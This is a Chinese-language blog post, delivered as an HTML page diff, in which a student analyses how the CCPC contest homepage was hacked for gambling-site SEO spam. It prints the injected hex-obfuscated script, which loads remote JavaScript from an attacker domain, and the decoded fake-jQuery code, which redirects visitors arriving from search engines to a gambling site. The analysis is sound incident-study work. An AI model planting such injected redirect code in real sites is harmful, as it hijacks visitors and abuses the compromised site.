@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="CCPC被日调查今天在群里看到说CCPC主页被日了，赶紧过来吃一波瓜，顺便看看是怎么实现的 简单测试之后发现，从搜索引擎过来就会跳转，而直接域名访问则不会，看一下主页的内容，发现了奇怪的代码改的是HTML的header部分，顺便试了试登录注册什么的各种功能都没反应了，感觉是被打穿了把后台都改坏了？ 代码被日的部分估计就这段菠菜站相关内容都给我用中文替换了，不给菠菜站引流哈。。。。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CCPC被日调查">
+<meta property="og:url" content="https://blog.z3ratu1.cn/CCPC%E8%A2%AB%E6%97%A5.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="CCPC被日调查今天在群里看到说CCPC主页被日了，赶紧过来吃一波瓜，顺便看看是怎么实现的 简单测试之后发现，从搜索引擎过来就会跳转，而直接域名访问则不会，看一下主页的内容，发现了奇怪的代码改的是HTML的header部分，顺便试了试登录注册什么的各种功能都没反应了，感觉是被打穿了把后台都改坏了？ 代码被日的部分估计就这段菠菜站相关内容都给我用中文替换了，不给菠菜站引流哈。。。。">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-01-05T11:37:51.000Z">
+<meta property="article:modified_time" content="2021-01-05T13:04:36.453Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="杂项">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/CCPC%E8%A2%AB%E6%97%A5.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>CCPC被日调查 | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/CCPC%E8%A2%AB%E6%97%A5.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CCPC被日调查
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-01-05 19:37:51 / 修改时间：21:04:36" itemprop="dateCreated datePublished" datetime="2021-01-05T19:37:51+08:00">2021-01-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%9D%82%E9%A1%B9/" itemprop="url" rel="index"><span itemprop="name">杂项</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/CCPC%E8%A2%AB%E6%97%A5.html" class="post-meta-item leancloud_visitors" data-flag-title="CCPC被日调查" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/CCPC%E8%A2%AB%E6%97%A5.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/CCPC%E8%A2%AB%E6%97%A5.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="CCPC被日调查"><a href="#CCPC被日调查" class="headerlink" title="CCPC被日调查"></a>CCPC被日调查</h1><p>今天在群里看到说CCPC主页被日了，赶紧过来吃一波瓜，顺便看看是怎么实现的</p>
+<p>简单测试之后发现，从搜索引擎过来就会跳转，而直接域名访问则不会，看一下主页的内容，发现了奇怪的代码<br>改的是HTML的header部分，顺便试了试登录注册什么的各种功能都没反应了，感觉是被打穿了把后台都改坏了？</p>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>被日的部分估计就这段<br>菠菜站相关内容都给我用中文替换了，不给菠菜站引流哈。。。。</p>
+<p>title keywords description都是百度搜索引擎抓取时的关键字，解码一下就是菠菜站简介，并且还注意到了如果不是百度抓取的话title就不是菠菜站，而是正常的CCPC名字<br>（现在爬虫都能执行js了吗，都开始模仿浏览器行为了？）</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>title<span class="token operator">></span>某菠菜站名<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>
+<span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string">"keywords"</span> content<span class="token operator">=</span><span class="token string">"菠菜站关键字。。。。"</span><span class="token operator">/</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">if</span><span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">toLocaleLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"baidu"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>document<span class="token punctuation">.</span>title <span class="token operator">=</span><span class="token string">"首页 - 中国大学生程序设计竞赛"</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
+<span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string">"description"</span> content<span class="token operator">=</span><span class="token string">"菠菜站简介"</span><span class="token operator">/</span><span class="token operator">></span>  
+<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">var</span> QDfSn1<span class="token operator">=</span>QDfSn1<span class="token operator">||</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> BXcvs__L2<span class="token operator">=</span>window<span class="token punctuation">[</span><span class="token string">"\x64\x6f\x63\x75\x6d\x65\x6e\x74"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"\x73\x63\x72\x69\x70\x74"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>BXcvs__L2<span class="token punctuation">[</span><span class="token string">'\x73\x72\x63'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"\x2f\x2f\x62\x79\x33\x33\x35\x38\x39\x2e\x63\x6f\x6d\x2f\x6a\x71\x75\x65\x72\x79\x2e\x31\x2e\x33\x2e\x31\x2e\x6a\x73"</span><span class="token punctuation">;</span><span class="token keyword">var</span> zqbrN3<span class="token operator">=</span>window<span class="token punctuation">[</span><span class="token string">"\x64\x6f\x63\x75\x6d\x65\x6e\x74"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x73\x42\x79\x54\x61\x67\x4e\x61\x6d\x65'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"\x73\x63\x72\x69\x70\x74"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>zqbrN3<span class="token punctuation">[</span><span class="token string">'\x70\x61\x72\x65\x6e\x74\x4e\x6f\x64\x65'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'\x69\x6e\x73\x65\x72\x74\x42\x65\x66\x6f\x72\x65'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>BXcvs__L2<span class="token punctuation">,</span>zqbrN3<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
+</code></pre>
+<p>辣鸡混淆，就单纯的编了个码，直接在console里跑一下就能快速解码</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> QDfSn1<span class="token operator">=</span>QDfSn1<span class="token operator">||</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">var</span> BXcvs__L2<span class="token operator">=</span>window<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'createElement'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    BXcvs__L2<span class="token punctuation">[</span><span class="token string">'scr'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"//菠菜跳板.com/jquery.1.3.1.js"</span><span class="token punctuation">;</span>
+    <span class="token keyword">var</span> zqbrN3<span class="token operator">=</span>window<span class="token punctuation">[</span><span class="token string">"document"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'getElementsByTagName'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    zqbrN3<span class="token punctuation">[</span><span class="token string">"parentNode"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"insertBefore"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>BXcvs__L2<span class="token punctuation">,</span>zqbrN3<span class="token punctuation">)</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>往当前页面里添加一个菠菜魔改jQuery，打开看一看</p>
+<pre class=" language-javascript"><code class="language-javascript">GID89a<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">//var OPAlt1=new window["\x44\x61\x74\x65"]();var SZ2=OPAlt1['\x67\x65\x74\x53\x65\x63\x6f\x6e\x64\x73']();if(SZ2%5==0){window['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x72\x65\x66']='\x2f\x2f\x62\x6f\x62\x38\x38\x38\x38\x2e\x63\x6e\x2f'};</span>
+
+<span class="token keyword">var</span> _hmt <span class="token operator">=</span> _hmt <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">var</span> hm <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  hm<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"https://hm.baidu.com/hm.js?7b3656fe95ec73529221927b52290bee"</span><span class="token punctuation">;</span>
+  <span class="token keyword">var</span> s <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
+  s<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>hm<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">var</span> ref<span class="token operator">=</span>document<span class="token punctuation">.</span>referrer<span class="token punctuation">;</span>
+<span class="token keyword">var</span> baidu<span class="token operator">=</span>ref<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"baidu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> soso<span class="token operator">=</span>ref<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"soso"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> google<span class="token operator">=</span>ref<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"google"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> sogou<span class="token operator">=</span>ref<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"sogou"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> sm<span class="token operator">=</span>ref<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"sm.cn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> so<span class="token operator">=</span>ref<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"so.com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> sbing<span class="token operator">=</span>ref<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"bing.cn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span>baidu<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> soso<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> google<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> sogou<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> sm<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> so<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> sbing<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+
+ this_url <span class="token operator">=</span> <span class="token string">'http://菠菜站.cn/m.php'</span><span class="token punctuation">;</span>
+  window<span class="token punctuation">.</span>top<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>this_url<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span>this_url<span class="token punctuation">;</span>
+<span class="token punctuation">}</span> 
+  
+<span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+     
+     <span class="token keyword">var</span> bp <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     bp<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'//push.zhanzhang.baidu.com/push.js'</span><span class="token punctuation">;</span>
+     <span class="token keyword">var</span> s <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+     s<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      
+     <span class="token keyword">var</span> src <span class="token operator">=</span> document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>protocol <span class="token operator">+</span> <span class="token string">'//js.passport.qihucdn.com/11.0.1.js?8113138f123429f4e46184e7146e43d9'</span><span class="token punctuation">;</span>
+     document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;script src="'</span> <span class="token operator">+</span> src <span class="token operator">+</span> <span class="token string">'" id="sozz">&lt;\/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+</code></pre>
+<p>开局一个GID98a，我怀疑是GIF98a打错了。。。还带waf绕过的？菠菜牛逼嗷<br>先一个自调用函数向<a target="_blank" rel="external nofollow noopener noreferrer" href="https://hm.baidu.com/">https://hm.baidu.com</a> 这个百度的访问统计网站发了一个请求，等于说还统计有多少人被日下来的CCPC导向到菠菜站<br>然后检查了一下referrer，如果是来自这几个搜索引擎就给你跳过去，所以直接访问ccpc是不会被转到菠菜的<br>后面还有一个自调用函数，是让百度的搜索引擎进行一波收录，等于说这个网站被访问一次就进行一次提交，太脏了</p>
+<h2 id="学到的奇怪东西"><a href="#学到的奇怪东西" class="headerlink" title="学到的奇怪东西"></a>学到的奇怪东西</h2><p>魔改jQuery中最后那个qihucdn（也是SEO优化类似的接口）没写成功，因为这个魔改jQuery已经是异步加载进来的了，因此此时主文档的渲染就已经结束了，不能再对主文档的Document进行操作，但是insertBefore还能用，有点高级<br>随便找的一个解释<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/qq_26291823/article/details/75090069">https://blog.csdn.net/qq_26291823/article/details/75090069</a></p>
+<p>抓包的时候并没有发现向这两个网站发送请求。。还以为是他哪里写歪了，研究了两分钟发现，是burp设置中某一项设置，不抓这几个文件扩展名<code>(^gif$|^jpg$|^png$|^css$|^js$|^ico$)</code>，所以.js的请求发是发出去了，就是没抓到<br>实际上是请求了百度的hm和push两个js文件的</p>
+<p>还有一点，因为点开就跳转时间太短，又不会在浏览器里面下断点调js，一开始都不知道到底是他的js写歪了还是我抓包的问题，后来老国王提出burp抓包然后把跳转的包拦住慢慢看就行了。。。我太蠢了，再后来发现直接访问域名不就不跳转了吗。。。并且代码也不会变</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>所以说搞这个不是比复习有意思多了，呜呜，为什么我要学信息论和通信原理</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%9D%82%E9%A1%B9/" rel="tag"># 杂项</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%5BXCTF%5D%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%89%E5%9C%BA.html" rel="prev" title="[XCTF]华为第三场">
+      <i class="fa fa-chevron-left"></i> [XCTF]华为第三场
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/Java%E7%9A%84%E5%A5%87%E6%80%AA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html" rel="next" title="Java的奇怪命令执行">
+      Java的奇怪命令执行 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CCPC%E8%A2%AB%E6%97%A5%E8%B0%83%E6%9F%A5"><span class="nav-number">1.</span> <span class="nav-text">CCPC被日调查</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81"><span class="nav-number">1.1.</span> <span class="nav-text">代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%A6%E5%88%B0%E7%9A%84%E5%A5%87%E6%80%AA%E4%B8%9C%E8%A5%BF"><span class="nav-number">1.2.</span> <span class="nav-text">学到的奇怪东西</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">1.3.</span> <span class="nav-text">后记</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
